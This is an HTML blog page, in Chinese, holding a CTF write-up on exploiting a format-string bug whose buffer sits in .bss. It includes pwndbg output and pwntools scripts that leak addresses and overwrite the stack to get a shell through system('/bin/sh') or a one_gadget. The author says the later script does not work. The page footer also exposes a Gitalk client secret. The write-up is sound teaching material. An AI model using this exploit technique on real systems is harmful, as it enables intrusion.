@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/a.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/a.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Consolas:300,300italic,400,400italic,700,700italic|隶书:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ll1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="这是一道fmt在bss段上的题。通过这道题我对格式化字符串的理解上了一个新的台阶…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小朋友，儿童节快乐鸭">
+<meta property="og:url" content="http://ll1ng.github.io/2020/06/01/fmt/index.html">
+<meta property="og:site_name" content="here&#39;s ling&#39;s blog">
+<meta property="og:description" content="这是一道fmt在bss段上的题。通过这道题我对格式化字符串的理解上了一个新的台阶…">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-07-30T15:45:04.971Z">
+<meta property="article:author" content="ling">
+<meta property="article:tag" content="pwn_stack">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://ll1ng.github.io/2020/06/01/fmt/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>小朋友，儿童节快乐鸭 | here's ling's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="here's ling's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">here's ling's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">月が绮丽ですね</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ll1ng.github.io/2020/06/01/fmt/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/%E7%A9%B9.jpg">
+      <meta itemprop="name" content="ling">
+      <meta itemprop="description" content="永远不要停止思考啊">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="here's ling's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          小朋友，儿童节快乐鸭
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-01 00:00:00" itemprop="dateCreated datePublished" datetime="2020-06-01T00:00:00+08:00">2020-06-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-30 23:45:04" itemprop="dateModified" datetime="2020-07-30T23:45:04+08:00">2020-07-30</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这是一道fmt在bss段上的题。通过这道题我对格式化字符串的理解上了一个新的台阶…</p>
+<a id="more"></a>
+<p>&emsp;&emsp;第一篇技术类博文诶！先激动一下下~<br><br>&emsp;&emsp;<strong>（本文中fmt均指格式化字符串）通篇是结合wiki和做题的个人理解，错误之处望读者不吝赐教</strong><br><br>&emsp;&emsp;fmt这个漏洞比较考验对指针的理解，初次接触时可能会比较吃力（主要指我）。总的来说，经过西工大这两道题，我对fmt这个漏洞的理解如下：<br></p>
+<ul>
+<li>fmt读的漏洞：<ul>
+<li>可以通过<code>%n$p</code>直接获得fmt相对偏移处的数值。原理是当成指针输出（十六进制形式，32位64位都可）</li>
+<li>可以通过<code>%n$s</code>获得偏移处（这是一个地址）所指向的内存的内容。原理是当成字符串地址去解析并输出该地址对应内存的字符串形态。所以当此处被当成地址却不合法时程序会报segment fault错。</li>
+</ul>
+</li>
+<li>fmt写的漏洞<ul>
+<li>通过<code>%nc$hhn</code>,hn,n（$前的n表示任意整数，c表示以字符形式，我比较常用，$后为固定用法）可向偏移处<strong>所指向的内存</strong>最低字节/最低两字节/最低四字节写入printf已打印出的字符个数。（此处表述可能不够严谨，因为会有想要修改的内存地址不是整8位，4位的情况，这种情况下hhn可使用，hn和n的效果倒是还没试过）<code>%nc%n$hhn</code>，可如是使用。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>注1：n指相对于fmt的偏移。32位在栈上依次是1,2,3…；64位前6个参数在寄存器（包括存放fmt地址的rdi寄存器），之后的参数在栈上（第一个在栈上的数据是printf的第七个参数，相对fmt偏移为6）</p>
+</blockquote>
+<blockquote>
+<p>注2：写的漏洞描述如上，也就是说能够通过偏移直接改写的只有存放二级及以上指针的内存，直接改写会报错。（6.19：一级应该是部分可以改，要看目标地址是否合法（存在及可写））</p>
+</blockquote>
+<p>题目64位，ida结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0x64uLL);</span><br><span class="line">    if ( !strcmp(buf, &quot;66666666&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    printf(buf, &quot;66666666&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>双击buf，我们看到buf在bss段。这里尝试解释一下fmt在bss段是如何增加难度的。在栈上时，我们能够控制的输入在栈上，可直接通过<code>%nc%n$hhn</code>对我们的输入（想要修改的变量所在的地址）所指向的内存进行修改。在bss段上则无法直接通过上述接触到输入，也就无法直接进行修改。<br>首先说明如何找到<code>pop rdi ret</code>和<code>system</code>，<code>/bin/sh</code>所在地址<br>在printf处下断点，然后<code>stack 31</code><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 31</span><br><span class="line">00:0000│ rsp  0x7fffffffdde8 —▸ 0x555555554824 (main+138) ◂— jmp    0x5555555547da</span><br><span class="line">01:0008│ rbp  0x7fffffffddf0 —▸ 0x555555554830 (__libc_csu_init) ◂— push   r15</span><br><span class="line">02:0010│      0x7fffffffddf8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">03:0018│      0x7fffffffde00 ◂— 0x1</span><br><span class="line">04:0020│      0x7fffffffde08 —▸ 0x7fffffffded8 —▸ 0x7fffffffe241 ◂— &#39;&#x2F;home&#x2F;ling&#x2F;now&#x2F;game&#x2F;now&#x2F;history&#x2F;west&#x2F;hill&#x2F;deploy_pwn&#x2F;deploy&#x2F;format_level2&#x2F;src&#x2F;pwn&#39;</span><br><span class="line">05:0028│      0x7fffffffde10 ◂— 0x1f7ffcca0</span><br><span class="line">06:0030│      0x7fffffffde18 —▸ 0x55555555479a (main) ◂— push   rbp</span><br><span class="line">07:0038│      0x7fffffffde20 ◂— 0x0</span><br><span class="line">08:0040│      0x7fffffffde28 ◂— 0x2cc87ef76f3dd02d</span><br><span class="line">09:0048│      0x7fffffffde30 —▸ 0x555555554690 (_start) ◂— xor    ebp, ebp</span><br><span class="line">0a:0050│      0x7fffffffde38 —▸ 0x7fffffffded0 ◂— 0x1</span><br><span class="line">0b:0058│      0x7fffffffde40 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0d:0068│      0x7fffffffde50 ◂— 0x799d2ba2435dd02d</span><br><span class="line">0e:0070│      0x7fffffffde58 ◂— 0x799d3b18508dd02d</span><br><span class="line">0f:0078│      0x7fffffffde60 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">12:0090│      0x7fffffffde78 —▸ 0x7fffffffdee8 —▸ 0x7fffffffe293 ◂— &#39;XDG_VTNR&#x3D;7&#39;</span><br><span class="line">13:0098│      0x7fffffffde80 —▸ 0x7ffff7ffe168 —▸ 0x555555554000 ◂— jg     0x555555554047</span><br><span class="line">14:00a0│      0x7fffffffde88 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0</span><br><span class="line">15:00a8│      0x7fffffffde90 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">17:00b8│      0x7fffffffdea0 —▸ 0x555555554690 (_start) ◂— xor    ebp, ebp</span><br><span class="line">18:00c0│      0x7fffffffdea8 —▸ 0x7fffffffded0 ◂— 0x1</span><br><span class="line">19:00c8│      0x7fffffffdeb0 ◂— 0x0</span><br><span class="line">1a:00d0│      0x7fffffffdeb8 —▸ 0x5555555546ba (_start+42) ◂— hlt    </span><br><span class="line">1b:00d8│      0x7fffffffdec0 —▸ 0x7fffffffdec8 ◂— 0x1c</span><br><span class="line">1c:00e0│      0x7fffffffdec8 ◂— 0x1c</span><br><span class="line">1d:00e8│ r13  0x7fffffffded0 ◂— 0x1</span><br><span class="line">1e:00f0│      0x7fffffffded8 —▸ 0x7fffffffe241 ◂— &#39;&#x2F;home&#x2F;ling&#x2F;now&#x2F;game&#x2F;now&#x2F;history&#x2F;west&#x2F;hill&#x2F;deploy_pwn&#x2F;deploy&#x2F;format_level2&#x2F;src&#x2F;pwn&#39;</span><br></pre></td></tr></table></figure>
+<p>首先找目标地址吧。<br><code>pop rdi ret</code>可用<code>ROPgadget</code>找到，其实还需要<code>ret</code>，因为题目说明远程是18.04，有个对齐的问题，不加<code>ret</code>的话16.04本地能打通但是远程会报错<code>timeout: the monitored command dumped core</code>。具体原因可见<a href="https://www.cnblogs.com/Rookle/p/12871878.html" target="_blank" rel="noopener">这篇博客</a>。<br>不难发现加载时程序地址随机，不过后三位一定，所以我们可以先在调试时确定目标地址和我们能够得到的地址的偏移，然后通过运行时泄露能够得到的地址和偏移计算出目标地址。结合<code>vmmap</code>，栈和库的位置同样可以如此获得。这里我分别用偏移为1处获得<code>pop rdi ret</code>，9处获得栈的地址（并计算栈顶），7处获得库中<code>__libc_start_main</code>的地址，从而得知<code>system</code>和<code>/bin/sh</code>的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#get_file_offset to get pop rdi</span><br><span class="line">p.sendline(&quot;%p\0&quot;)</span><br><span class="line">one_arg_offset&#x3D;int(p.recv(14),16)</span><br><span class="line">file_base&#x3D;one_arg_offset-0x8b4</span><br><span class="line">pop_rdi&#x3D;file_base+0x893</span><br><span class="line">ret&#x3D;0x626+file_base</span><br><span class="line">log.info(&#39;pop rdi:&#39;+hex(pop_rdi))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get_stack_rsp_offset</span><br><span class="line">p.sendline(&quot;%9$p\0&quot;)#addr in stack</span><br><span class="line">stack0&#x3D;int(p.recv(14),16)-232</span><br><span class="line">#change here doen&#39;t matter where to jump</span><br><span class="line">stack&#x3D;stack0-8</span><br><span class="line">log.info(&#39;stack0:&#39;+hex(stack0))</span><br><span class="line">new_jump&#x3D;184+stack0</span><br><span class="line">#at offset 29</span><br><span class="line">log.info(&quot;new_jump:&quot;+hex(new_jump))</span><br><span class="line">#get_libc_3rd_offset</span><br><span class="line">p.sendline(&quot;%7$p\0&quot;)</span><br><span class="line">libc_start_main&#x3D;int(p.recv(14),16)-240</span><br><span class="line">log.info(&#39;libc_start_main:&#39;+ hex(libc_start_main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main)</span><br><span class="line">libc_base &#x3D; libc_start_main - libc.dump(&quot;__libc_start_main&quot;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh &#x3D; libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">log.info(&quot;libc_base:&quot;+hex(libc_base))</span><br><span class="line">log.info(&#39;system:&#39;+hex(system_addr))</span><br><span class="line">log.info(&#39;bin_sh:&#39;+hex(bin_sh))</span><br></pre></td></tr></table></figure>
+<p>接下来进行修改。<br>手动改的过程中发现进入printf前除了栈顶，栈顶+8，+16的位置都可以修改且修改能一直不被破坏，所以选择先修改栈顶以下的内容，最后再修改栈顶跳转到<code>pop rdi ret</code>处。（其实应该看汇编的吧。。我怎么就赖上调试了呢，害）<br>以下是我修改的具体操作：在栈上找到一个指向栈内地址的二级及以上指针。我一开始找的是偏移为9处，跳板就在对应的35处。手动改的时候感觉9和35这两个地方挺稳定的，因为printf完后在下一次printf前就能看到结果，然鹅是我太天真…调试的时候发现再经过一次printf，35处低两字节就会变到0007。<del>甚至还跑去问槐它为什么自己会变指向，我没被打死真是一个奇迹</del>不过既然能控制一次，那么每次都重新改一次指向应该也能做所以就没换地方，继续用35处做的题。<br><br>接下来就是手动改了。注意到地址基本都是6个字节（啊你在说什么你这个全靠调试不看书的家伙！）所以编写了这两个函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def point_to_target(addr):</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%9$hn&#39;.format(int(hex(new_jump)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%35$hn&#39;.format(int(hex(addr)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line">def change(addr,value):</span><br><span class="line">    svalue&#x3D;hex(value)[2:]#12 bit,6 byte</span><br><span class="line">    print svalue</span><br><span class="line">    for i in range(5,-1,-1):  </span><br><span class="line">        print svalue[2*i:2*i+2]</span><br><span class="line">        point_to_target(addr+5-i)        </span><br><span class="line">        log.info(&quot;point to stack0+&#123;&#125;&quot;.format(5-i))        </span><br><span class="line">        #p.recv()</span><br><span class="line">        payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[2*i:2*i+2],16))</span><br><span class="line">        p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">        p.recv()</span><br></pre></td></tr></table></figure>
+<p>值得注意的一个地方是read函数接收到<code>\0</code>也不会截断，所以我填补99个<code>\x00</code>并连带<code>sendline</code>最后的换行符一共100个字符。也可以<code>payload.ljust(&#39;\x00&#39;,100)</code>然后用<code>send</code>发送。（咳咳，7.30我来打脸。read读的时候可以直接send()…我整麻烦了。<strong>这里还有个奇怪的东东没搞懂就是输入会堆在一起那个现象</strong>）最后修改部分的exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">change(stack0,bin_sh)</span><br><span class="line">change(stack0+8,system_addr)</span><br><span class="line">point_to_target(stack)</span><br><span class="line">svalue&#x3D;hex(pop_rdi)</span><br><span class="line">payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[-4:],16))</span><br><span class="line">p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>环境关闭木有远程打的机会了，<code>ret</code>的部分就<del>懒得</del>没加，道理应该是一样的。不过加<code>ret</code>的话会改到9的位置，emm有点子问题。先留坑，以后再填。溜了溜了</p>
+<h3 id="6-27用one-gadget做了一下"><a href="#6-27用one-gadget做了一下" class="headerlink" title="6.27用one_gadget做了一下"></a>6.27用<code>one_gadget</code>做了一下</h3><p>额，心态有点炸，因为又是调试出来的，但是不会调其他版本就很伤…这个汇编实际执行情况和我预料的出入有点大，先记下来以后看看能不能明白8<br></p>
+<p>呃呃还知道了<code>one gadget libc</code>结果的后面<code>==NULL</code>的意思是执行条件，后面堆要是都不满足的话还得自己构造。行（</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">#p&#x3D;process([&#39;.&#x2F;pwn&#39;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&#39;.&#x2F;libc-2.27.so&#39;&#125;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so&#39;)</span><br><span class="line">one_gadget223&#x3D;0xf1147</span><br><span class="line"></span><br><span class="line">#get_file_offset to get pop rdi</span><br><span class="line">p.sendline(&quot;%p\0&quot;)</span><br><span class="line">one_arg_offset&#x3D;int(p.recv(14),16)</span><br><span class="line">file_base&#x3D;one_arg_offset-0x8b4</span><br><span class="line">pop_rdi&#x3D;file_base+0x893</span><br><span class="line">ret&#x3D;0x626+file_base</span><br><span class="line">log.info(&#39;pop rdi:&#39;+hex(pop_rdi))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get_stack_rsp_offset</span><br><span class="line">p.sendline(&quot;%9$p\0&quot;)#addr in stack</span><br><span class="line">stack0&#x3D;int(p.recv(14),16)-232</span><br><span class="line">#change here doen&#39;t matter where to jump</span><br><span class="line">stack&#x3D;stack0-8</span><br><span class="line">log.info(&#39;stack0:&#39;+hex(stack0))</span><br><span class="line">new_jump&#x3D;184+stack0</span><br><span class="line">#at offset 29</span><br><span class="line">log.info(&quot;new_jump:&quot;+hex(new_jump))</span><br><span class="line">#get_libc_3rd_offset</span><br><span class="line">p.sendline(&quot;%7$p\0&quot;)</span><br><span class="line">#print p.recvuntil(&#39;0x&#39;)</span><br><span class="line">libc_start_main&#x3D;int(p.recv(14),16)-240</span><br><span class="line">log.info(&#39;libc_start_main:&#39;+ hex(libc_start_main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget_actual&#x3D;libc_start_main-libc.sym[&#39;__libc_start_main&#39;]+one_gadget223</span><br><span class="line">log.info(&quot;one gadget:&quot;+hex(one_gadget_actual))</span><br><span class="line"></span><br><span class="line">def point_to_target(addr):</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%9$hn&#39;.format(int(hex(new_jump)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload&#x3D;&#39;%&#123;&#125;c%35$hn&#39;.format(int(hex(addr)[-4:],16))</span><br><span class="line">    p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def change(addr,value):</span><br><span class="line">    svalue&#x3D;hex(value)[2:]#12 bit,6 byte</span><br><span class="line">    print svalue</span><br><span class="line">    for i in range(5,-1,-1):  </span><br><span class="line">        print svalue[2*i:2*i+2]</span><br><span class="line">        point_to_target(addr+5-i)        </span><br><span class="line">        log.info(&quot;point to stack0+&#123;&#125;&quot;.format(5-i))        </span><br><span class="line">        #p.recv()</span><br><span class="line">        payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[2*i:2*i+2],16))</span><br><span class="line">        p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line">        p.recv()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">change(stack0+8,one_gadget_actual)</span><br><span class="line">log.info(&quot;stack0 change&quot;)</span><br><span class="line">change(stack0,ret)</span><br><span class="line">point_to_target(stack)</span><br><span class="line">svalue&#x3D;hex(ret)</span><br><span class="line">payload&#x3D;&#39;%&#123;&#125;c%29$hhn&#39;.format(int(svalue[-4:],16))</span><br><span class="line">p.sendline(payload.ljust(99,&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>问题出在将栈顶改为<code>ret</code>而+8的位置改为<code>one_gadget</code>时汇编最后<code>pop rbp ret</code>，<code>ret</code>的是+16处<code>__libc_start_main+240</code>…懵逼，我就又加了一句<code>ret</code>。<br></p>
+<p>隔得久了我不知道上一句我在说啥，反正上面脚本跑不通，再留坑。整体来说这个方法不是太好感觉，可拓展性不够强。</p>
+
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn-stack/" rel="tag"># pwn_stack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/27/%E6%88%91%E6%9D%A5%E8%AF%95%E8%AF%95/" rel="prev" title="我来试试">
+      <i class="fa fa-chevron-left"></i> 我来试试
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/30/%E4%B8%80%E9%81%93maze/" rel="next" title="一道maze">
+      一道maze <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
